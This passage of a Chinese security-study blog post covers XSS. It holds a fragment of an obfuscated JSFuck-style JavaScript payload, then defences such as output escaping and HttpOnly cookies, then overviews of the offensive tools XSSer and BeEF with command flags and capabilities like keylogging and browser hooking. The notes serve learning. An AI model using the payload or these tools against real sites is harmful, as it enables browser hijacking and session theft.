title="你知道得太多了">[]+[])[+[]]+(</span>[]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(<span class="spoiler" title="你知道得太多了">[]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(</span>[]+[])[+!+[]]</a>()&lt;/script&gt;</p>
+<p>XSS 的辅助性对策：<br />
+输入校验：通过检验输入值的有效性，当输入值不符和条件是就显示错误消息，并促使用户重新输入，有时也能够防御 XSS 攻击。</p>
+<pre><code>给Cookie添加HttpOnly属性：Cookie中有名为HttpOnly属性，该属性能禁止JavaScript读取Cookie值。
+
+通过给Cookie添加HttpOnly属性，能够杜绝XSS中窃取会话ID这一典型的攻击手段。但需要注意的是其他攻击手段依然有效，所以这样只能是限制了攻击者的选择范围，并不能杜绝所有的XSS攻击。
+
+php.init:session.cookie_httponly=On 
+</code></pre>
+<p>XSS 对策总结：<br />
+根本性对策（个别对策）</p>
+<pre><code>HTML的元组内容：使用htmlspecialchars函数转义。
+</code></pre>
+<p>属性值：使用 htmlspecialchars 函数转义并用双引号括起来。<br />
+根本性对策（共通对策）</p>
+<pre><code>明确设置HTTL响应的字符编码。
+辅助对策：
+
+（a）输入校验
+（b）给Cookie添加HttpOnly属性。
+</code></pre>
+<p>HTML 组成元素</p>
+<p>1. 脚本（事件绑定）<br />
+2. 事件绑定函数中的字符串字面量<br />
+ 3. 属性值 /（URL），属性位置防止双引号。<br />
+4. 元素内容，元素位置防止尖角符号。<br />
+5.script 元素中南的字符串字面量</p>
+<pre><code>XSSer简介-确认XSS存在的工具
+XSSer概述：
+</code></pre>
+<p>跨站点 “Scripter”（又名 XSSer）是一个自动化框架，用于检测、利用以及报告基于 Web 应用程序<br />
+中的 XSS 漏洞。</p>
+<pre><code>XSS是Web应用常见的漏洞。利用该漏洞，安全人员在网站注入恶意脚本，控制用户浏览器，并发起其他渗透操作。XSSer是Kali Linux提供的一款自动化XSS攻击框架。该工具可以同时探测多个网址。如果发现XSS漏洞，可以生成报告，并直接进行利用，如建立反向连接。为了提供攻击效率，该工具支持各种规避措施，如判断XSS过滤器、规避特定的防火墙、编码规避。同时，该工具提供丰富的选项，供用户自定义攻击，如指定攻击载荷、设置漏洞利用代码等。
+
+一个自动框架、检测，利用和报告基于Web应用的XSS漏洞。
+
+支持命令行、图形化界面。
+
+提供绕过服务器过滤的选项，以及一些特殊的代码注入技术。
+
+XSSer经典命令：
+</code></pre>
+<p>(a)-u URL, --url=URL  添加 URL<br />
+ (b)-g Getdata	使用 GET 提交数据<br />
+ (c)-p POSTdata 使用 post 提交数据<br />
+ (d)--cookie=COOKIE 提供 cookie 信息<br />
+ (e)-s, --statistics 显示统计信息<br />
+ (f)-v, --verbose 展示详细结果<br />
+ (g)--reverse-check 反向连接检查</p>
+<pre><code>BeEF攻击简介
+BeEF概述：
+</code></pre>
+<p>通过 XSS 漏洞，将 hook.js 脚本注入，可将中招的客户端挂起。</p>
+<p>如果客户端浏览器关掉，则连接会断开。</p>
+<p>可以做持久化连接。不让用户关闭浏览器，或者后台开一个小窗。</p>
+<pre><code>BeEF（Brower exploitation framerwork）：
+</code></pre>
+<p>1. 生成，交付 Payload<br />
+2.Ruby 语言编写<br />
+ 3. 服务器端：管理 Hooked 客户端<br />
+ 4. 客户端：运行与客户端浏览器的 JS 脚本（hook）降低白帽子对 JS 代码的要求。</p>
+<pre><code>BeEF主要针对浏览器（客户）进行攻击。
+
+应用普遍转移到B/S架构，浏览器称为唯一客户端程序。
+结合社会工程学方法对浏览器进行攻击。
+攻击浏览器用户
+通过注入的JS脚本，刘勇浏览器工具其他网站
+BeEF攻击手段：
+</code></pre>
+<p>1. 利用网站 XSS 漏洞实现攻击<br />
+ 2. 诱使客户端访问包含 hook 的伪造网站<br />
+ 3. 结合中间人攻击注入 hook 脚本</p>
+<pre><code>1.软件攻击模块颜色介绍：
+2- 绿色模块：表示模块适合目标浏览器，并且执行结果客户端不可见
+3- 红色模块：表示模块不适合目标浏览器，有些红色模块也可正常运行
+4- 橙色模块：模块可用，但是结果对用户可见（例如：弹窗申请全新等）
+5- 灰色模块：模块未在目标浏览器测试过
+</code></pre>
+<p>BeEF 常见用途：<br />
+1. 键盘记录器<br />
+ 2. 网络扫描<br />
+ 3. 浏览器信息收集<br />
+ 4. 绑定 shell<br />
+5. 与 Metasploit 集成<br />
+ --&gt;</p>
+
+      <div class="tags">
+          <a href="/tags/xss/" rel="tag"><i class="ic i-tag"></i> xss</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2024-04-11 21:46:22" itemprop="dateModified" datetime="2024-04-11T21:46:22+08:00">2024-04-11</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="odiws Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="odiws PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://odiws.github.io/2024/03/31/xss%E7%AC%94%E8%AE%B0/" title="xss漏洞学习笔记">http://odiws.github.io/2024/03/31/xss笔记/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2024/03/25/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?917930" title="sqli-labs��sqlע��ѧϰ�ʼ�">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> ѧϰ�ʼ�</span>
+  <h3>sqli-labs��sqlע��ѧϰ�ʼ�</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2024/04/28/1_1/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?954627" title="buuctf4月27日">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> 学习笔记</span>
+  <h3>buuctf4月27日</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2023/12/17/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="bookmark" title="PHP学习笔记">PHP学习笔记</a></li><li><a href="/2024/01/24/python-requests%E5%BA%93flask%E5%BA%93%EF%BC%88%E6%9C%AA%E5%AE%8C%EF%BC%89/" rel="bookmark" title="python-requests库flask库（未完）">python-requests库flask库（未完）</a></li><li><a href="/2024/01/24/mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="bookmark" title="mysql学习笔记">mysql学习笔记</a></li><li><a href="/2024/01/24/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="bookmark" title="python学习笔记（未完）">python学习笔记（未完）</a></li><li><a href="/2024/03/25/upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AC%94%E8%AE%B0/" rel="bookmark" title="upload文件上传靶场学习笔记">upload文件上传靶场学习笔记</a></li><li class="active"><a href="/2024/03/31/xss%E7%AC%94%E8%AE%B0/" rel="bookmark" title="xss漏洞学习笔记">xss漏洞学习笔记</a></li><li><a href="/2024/04/28/1_1/" rel="bookmark" title="buuctf4月27日">buuctf4月27日</a></li><li><a href="/2024/04/28/2_1/" rel="bookmark" title="python request库的基本用法">python request库的基本用法</a></li><li><a href="/2024/10/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" rel="bookmark" title="反序列化漏洞总结">反序列化漏洞总结</a></li><li><a href="/2024/10/15/PwnThyBytes%E2%80%94%E2%80%942019-Baby-SQL/" rel="bookmark" title="[PwnThyBytes——2019]Baby_SQL">[PwnThyBytes——2019]Baby_SQL</a></li><li><a href="/2024/12/06/ctfshow-web-java/" rel="bookmark" title="ctfshow_web_java">ctfshow_web_java</a></li><li><a href="/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="bookmark" title="java反序列化学习笔记">java反序列化学习笔记</a></li><li><a href="/2025/03/28/rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="bookmark" title="rust学习笔记">rust学习笔记</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="odiws"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">odiws</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">180</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">13</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">141</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2024/03/25/sql%E6%B3%A8%E5%85%A5/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2024/04/28/1_1/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/ssti/" title="In ssti">ssti</a>
+</div>
+
+    <span><a href="/2024/06/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/" title="[网鼎杯2018]Unfinish">[网鼎杯2018]Unfinish</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/04/28/3-txt/" title="buuctf4月27日">buuctf4月27日</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/06/11/HarekazeCTF2019-encode-and-encode/" title="[HarekazeCTF2019]encode_and_encode">[HarekazeCTF2019]encode_and_encode</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/12/01/LineCTF2022-BB/" title="[LineCTF2022]BB">[LineCTF2022]BB</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/09/10/%E5%85%A5%E7%BE%A4%E9%A2%98-Web/" title="入群题]Web">入群题]Web</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/29/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/" title="[红明谷CTF-2021]EasyTP">[红明谷CTF-2021]EasyTP</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/ssti/" title="In ssti">ssti</a>
+</div>
+
+    <span><a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" title="&#39;[RootersCTF2019]I_&lt;3_Flask&#39;">'[RootersCTF2019]I_<3_Flask'</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/10/17/BSidesCF-2019-PickTacToe/" title="[BSidesCF2019]Pick Tac Toe">[BSidesCF2019]Pick Tac Toe</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql/" title="[NewStarCTF-2023-公开赛道]ez_sql">[NewStarCTF-2023-公开赛道]ez_sql</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/06/02/2017-SSRFme/" title="‘’[HITCON 2017]SSRFme‘’">‘’[HITCON 2017]SSRFme‘’</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">odiws @ zty153’s_blog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2024/03/31/xss笔记/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
